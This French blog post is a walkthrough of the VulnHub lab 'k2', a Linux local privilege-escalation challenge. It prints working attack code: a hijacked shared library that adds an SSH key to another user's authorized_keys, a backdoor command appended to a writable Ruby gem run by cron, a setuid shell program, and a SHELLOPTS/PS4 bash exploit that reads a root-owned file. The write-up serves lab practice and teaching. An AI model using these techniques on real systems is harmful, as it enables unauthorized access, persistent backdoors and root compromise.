# Solution du CTF /dev/random: k2 de VulnHub

Le challenge [K2](https://www.vulnhub.com/entry/devrandom-k2,204/) créé par [Sagi](https://twitter.com/@s4gi_) est le dernier en date de la série */dev/random* après les [Scream](http://devloop.users.sourceforge.net/index.php?article75/solution-du-ctf-scream), [Relativity](http://devloop.users.sourceforge.net/index.php?article71/solution-du-ctf-relativity), [Pipe](http://devloop.users.sourceforge.net/index.php?article137/solution-du-ctf-dev-random-pipe-de-vulnhub) et [Sleepy](http://devloop.users.sourceforge.net/index.php?article138/solution-du-ctf-dev-random-sleepy-de-vulnhub).  

L'occasion de boucler la série. Un nouvel opus serait toutefois le bienvenue :-)  

Enumération
-----------

Ce challenge a la particularité de se concentrer sur l'escalade de privilèges Linux. Du coup pas besoin de fouiller les ports ouverts sur la machine, on part directement avec les identifiants *user* / *password* qui nous donnent un accès SSH.  

Dans le fichier /etc/passwd on note quelques comptes utilisateurs et d'autres particuliers :  

```plain
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
chrony:x:997:995::/var/lib/chrony:/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
user2:x:1001:1001::/home/user2:/bin/bash
user3:x:996:994::/home/user3:/bin/bash
```

Un coup d’œil dans les process ne révèle aucun programme tournant avec les comptes *user2* ou *user3*. A noter également que ces utilisateurs font uniquement partie de leur propre groupe.  

La distribution est une CentOS Linux release 7.3.1611 (Core).  

Il est temps de regarder si ces utilisateurs ont des fichiers intéressants :  

```plain
[user@localhost ~]$ find / -user user2 2> /dev/null
/var/spool/mail/user2
/home/user2
[user@localhost ~]$ find / -group user2 2> /dev/null
/usr/local/share/gems/gems/rubyzip-1.2.1/lib/zip.rb
/home/user2
[user@localhost ~]$ find / -user user3 2> /dev/null
/tmp/firewalld-backup.zip
[user@localhost ~]$ find / -group user3 2> /dev/null
/tmp/firewalld-backup.zip
/usr/local/bin/whoisme
```

Voyons les permissions de ces fichiers :  

```plain
[user@localhost ~]$ ls -l /usr/local/share/gems/gems/rubyzip-1.2.1/lib/zip.rb
-rw-rw-r--. 1 root user2 1621 30 août  09:54 /usr/local/share/gems/gems/rubyzip-1.2.1/lib/zip.rb
[user@localhost ~]$ ls -l /tmp/firewalld-backup.zip
-rw-r--r--. 1 user3 user3 22 24 nov.  03:27 /tmp/firewalld-backup.zip
[user@localhost ~]$ ls -l /usr/local/bin/whoisme
-rwsr-xr--. 1 root user3 8616 30 août  09:54 /usr/local/bin/whoisme
```

C'est un bon début et on devine qu'on passera root depuis le compte *user3*. Un grep récursif dans /etc pour *user2* ne donne aucun résultat mais une entrée dans la crontab pour *user3*  
 :  

```plain
[user@localhost ~]$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
HOME=/

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
```

Hein ? J'ai la berlue ? Elle est où cette entrée ?  

```plain
[user@localhost ~]$ grep user3 /etc/crontab
* * * * * user3 /sbin/bckup
```

Hallucination ?  

```plain
[user@localhost ~]$ tac /etc/crontab

# *  *  *  *  * user-name  command to be executed
# |  |  |  |  |
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  .---------- day of month (1 - 31)
# |  .------------- hour (0 - 23)
# .---------------- minute (0 - 59)
* * * * * user3 /sbin/bckup:

# For details see man 4 crontabs

HOME=/
MAILTO=root
PATH=/sbin:/bin:/usr/sbin:/usr/bin
SHELL=/bin/bash
```

Ok donc cat n'affiche pas la ligne mais tac (qui affiche les lignes en sens inverse) le fait...  

En réalité le fichier contient [une séquence d'échappement qui cache la ligne](https://unix.stackexchange.com/posts/108269/revisions) intéressante :  

```plain
[user@localhost ~]$ cat -v /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
HOME=/

# For details see man 4 crontabs

* * * * * user3 /sbin/bckup
^[[3A

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
```

Bonne blague ! En revanche les permissions sur le programme appelé ne nous donnent pas plus d'indices :  

```plain
[user@localhost ~]$ ls -l /sbin/bckup
-rwxr-xr-x. 1 root root 356 30 août  09:54 /sbin/bckup
```

user++
------

On trouve finalement notre première étape via sudo :  

```plain
[user@localhost ~]$ sudo -l
[sudo] password for user:
Matching Defaults entries for user on this host:
    !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS
    _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User user may run the following commands on this host:
    (user2) /bin/calc
```

Un strings sur ce binaire révèle (en dehors qu'il a été écrit en C++) quelques chaînes intéressantes :  

```plain
Calculating something, please wait...
/home/user/.config/libcalc.so
Done.
```

Le dossier .config ainsi que la librairie n'existent pas, il faut donc créer cette dernière avec un code qui nous ouvrira l'accès et faire exécuter tout ça via sudo :  

```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include <sys/types.h>
#include <sys/stat.h>

#define PUBLIC_KEY "ssh-rsa <ma clé publique SSH>"

void _init(void) {
  FILE * fd;

  printf("In _init()\n");
  mkdir("/home/user2/.ssh", S_IRWXU);
  fd = fopen("/home/user2/.ssh/authorized_keys", "a");
  fputs(PUBLIC_KEY, fd);
  fclose(fd);
  chmod("/home/user2/.ssh/authorized_keys", S_IRUSR|S_IWUSR);
}

void __attribute__((constructor)) lib_init(void) {
  FILE * fd;

  printf("In constructor()\n");
  mkdir("/home/user2/.ssh", S_IRWXU);
  fd = fopen("/home/user2/.ssh/authorized_keys", "a");
  fputs(PUBLIC_KEY, fd);
  fclose(fd);
  chmod("/home/user2/.ssh/authorized_keys", S_IRUSR|S_IWUSR);
}
```

Compilation :  

```bash
gcc -fPIC -c libcalc.c
ld -shared -o libcalc.so libcalc.o
mkdir .config
mv libcalc.so .config/
```

Il faut aussi penser à rendre exécutable les dossiers /home/user, .config et donner des accès suffisant sur *libcalc.so* pour que *user2* puisse y accéder.  

On exécute calc et notre librairie est bien chargée :  

```plain
[user@localhost ~]$ sudo -u user2 /bin/calc
Calculating something, please wait...
In _init()
In constructor()
[=====================================================================>] 99 %
Done.
```

Détournement de Ruby
--------------------

Vu que notre librairie nous a ouvert l'accès à *user2*, c'est le moment de se pencher sur l'utilisateur suivant.  

On sait que le script */sbin/bckup* est appelé par cron en tant que *user3*. Voici son contenu :  

```plain
#!/usr/bin/env ruby

require 'rubygems'
require 'zip'

directory = '/etc/firewalld/'
zipfile_name = '/tmp/firewalld-backup.zip'

File.delete(zipfile_name) if File::exists?(zipfile_name)
Zip::File.open(zipfile_name, Zip::File::CREATE) do |zipfile|
        Dir[File.join(directory, '**', '**')].each do |file|
          zipfile.add(file.sub(directory, ''), file)
        end
end
```

Je ne connais rien à Ruby mais je sais que *user2* dispose des droits d'écriture sur le module zip. Il s'avère que le langage Ruby permet d'exécuter des commandes shell via l'utilisation des backticks... Une façon simple de backdoorer la librairie :)  

L'utilisateur *user3* n'a pas de dossier dans /home donc on ne peut pas copier le fichier *authorized\_keys* comme précédemment. On va compiler la backdoor setuid suivante :  

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
  setreuid(996, 996);
  setregid(994, 994);
  system("/bin/bash -p");
  return 0;
}
```

Puis on rajoute la ligne suivante à la fin du fichier *zip.rb* :  

```plain
print `cp /tmp/setuid_user3 /tmp/go_user3; chmod 6755 /tmp/go_user3;`
```

On attend quelques minutes et on a notre accès :  

```plain
-rwsr-sr-x. 1 user3 user3 8632 24 nov.  09:41 go_user3
```

```plain
[user2@localhost tmp]$ ./go_user3
bash: /home/user2/.bashrc: Permission non accordée
bash-4.2$ id
uid=996(user3) gid=994(user3) groupes=994(user3),1001(user2) contexte=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

g0tr00t?
--------

La dernière étape, on le devine, concerne l'exécutable *whoisme*.  

```plain
bash-4.2$ /usr/local/bin/whoisme
user2
```

Le programme est simple comme le laisse deviner strings :  

```plain
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
system
setgid
__libc_start_main
__gmon_start__
GLIBC_2.2.5
UH-H
UH-H
[]A\A]A^A_
/usr/bin/logname
```

On est bien sûr tenté de tester shellshock ou la faille d'exportation de fonctions :  

```plain
[user2@localhost user2]$ /tmp/go_user3
bash-4.2$ /usr/bin/logname () { /bin/bash; }
bash-4.2$ export -f /usr/bin/logname
bash-4.2$ whoisme
sh: erreur lors de l'import de la définition de fonction pour « BASH_FUNC_/usr/bin/logname »
user2

sh: error importing function definition for `BASH_FUNC_/usr/bin/logname'
```

On sait (à l'invite) que bash est en version 4.2. [D'après CVE Details](https://www.cvedetails.com/vulnerability-list/vendor_id-72/product_id-21050/version_id-172000/year-2017/opec-1/GNU-Bash-4.2.html), cette version a deux vulnérabilités.  

L'une concerne \h dans l'expansion du prompt (PS1) donc peu d'intérêt pour nous. En revanche [l'autre](http://www.openwall.com/lists/oss-security/2016/09/26/9) devrait être applicable :  

> Bash before 4.4 allows local users to execute arbitrary commands with root privileges via crafted SHELLOPTS and PS4 environment variables.

Et ça marche :  

```plain
bash-4.2$ env -i SHELLOPTS=xtrace PS4='$(cp /root/flag.txt /tmp; chmod 644 /tmp/flag.txt)' /usr/local/bin/whoisme
/usr/bin/logname
user2
bash-4.2$ ls /tmp/
firewalld-backup.zip  flag.txt  go_user3  setuid_user3  setuid_user3.c
bash-4.2$ cat /tmp/flag.txt

___________.__                      __            __
\_   _____/|  | _____     ____    _/  |____  ____/  |_
 |    __)  |  | \__  \   / ___\   \   __\  \/  /\   __\
 |     \   |  |__/ __ \_/ /_/  >   |  |  >    <  |  |
 \___  /   |____(____  /\___  / /\ |__| /__/\_ \ |__|
     \/              \//_____/  \/            \/

Congrats!! :D
FLAG: da96dd381dc607ccd3302312233531efa68b8b7b

-----------------------------------------------------
This challenge was created as part of:
Windows / Linux Local Privilege Escalation Workshop (@s4gi_)
```

Conclusion
----------

Un challenge différent des boot2root classiques avec un focus sur l'escalade de privilèges c'est toujours bon à prendre :)

*Published March 13 2018 at 13:56*